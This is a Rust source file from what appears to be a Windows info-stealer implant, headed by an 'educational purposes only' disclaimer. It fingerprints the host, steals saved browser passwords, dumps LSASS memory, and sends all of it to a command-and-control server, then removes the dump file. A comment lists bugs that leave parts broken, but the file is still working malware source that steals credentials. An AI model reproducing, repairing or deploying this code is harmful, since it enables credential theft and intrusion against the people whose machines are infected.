/*
** *********************************************************************
** *********************************************************************
**
**                              DISCLAIMER
**       For educational purposes only. 2026 All rights reversed.
**
** *********************************************************************
** *********************************************************************
*/

// payload/mod.rs — steal orchestrator (fingerprint, creds, LSASS dump).
//
// Called once from a background thread in main.rs. Clipper is a separate
// thread and is NOT started here.
//
// BROKEN:
//   - steal_all_browser_cookies() exists in steal.rs but is never called.
//   - LSASS dump is base64'd and sent as one C2 message; Worker truncates
//     ciphertext to 60 chars, so the dump cannot arrive.
//   - Chromium decrypt in steal.rs is DPAPI-only (wrong for v80+).

pub mod steal;
pub mod clipper;
pub mod lsass;

use log::{info, error};

/// Log-only init. No allocations or C2.
pub fn initialize() {
    info!("Payload modules initialised.");
}

/// One-shot: fingerprint → browser passwords → LSASS dump → C2 tags.
pub fn run() {
    info!("Payload running.");

    // 1. Device fingerprint → C2.
    let fp = get_device_fingerprint();
    crate::c2::send_data("fingerprint", &serde_json::to_string(&fp).unwrap_or_default());

    // 2. Browser credential theft.
    let creds = steal::steal_all_browser_credentials();
    if !creds.is_empty() {
        let payload = serde_json::to_string(&creds
            .iter()
            .map(|c| serde_json::json!({
                "url": c.url,
                "username": c.username,
                "password": c.password,
            }))
            .collect::<Vec<_>>())
            .unwrap_or_default();
        crate::c2::send_data("credentials", &payload);
    }

    // 3. LSASS dump (temp path, cleaned up after exfil).
    let dump_path = std::env::temp_dir()
        .join(format!("~{:x}.tmp", rand::random::<u32>()))
        .to_string_lossy()
        .to_string();
    if lsass::dump_lsass(&dump_path) {
        if let Ok(data) = std::fs::read(&dump_path) {
            use base64::Engine;
            let b64 = base64::engine::general_purpose::STANDARD.encode(&data);
            crate::c2::send_data("lsass_dump", &b64);
        }
        let _ = std::fs::remove_file(&dump_path);
    } else {
        error!("LSASS dump failed.");
    }
}

/// Host inventory JSON: hostname, OS, RAM, CPU, MachineGuid, user, UUID, safe mode.
pub fn get_device_fingerprint() -> serde_json::Value {
    use sysinfo::System;
    let mut sys = System::new_all();
    sys.refresh_all();
    serde_json::json!({
        "hostname":     sys.host_name().unwrap_or_default(),
        "os_version":   sys.os_version().unwrap_or_default(),
        "kernel":       sys.kernel_version().unwrap_or_default(),
        "memory":       sys.total_memory(),
        "cpu_count":    sys.cpus().len(),
        "machine_guid": crate::utils::get_machine_guid().unwrap_or_default(),
        "username":     crate::utils::get_username().unwrap_or_default(),
        "implant_uuid": env!("IMPLANT_UUID"),
        "safe_mode":    crate::is_safe_mode(),
    })
}
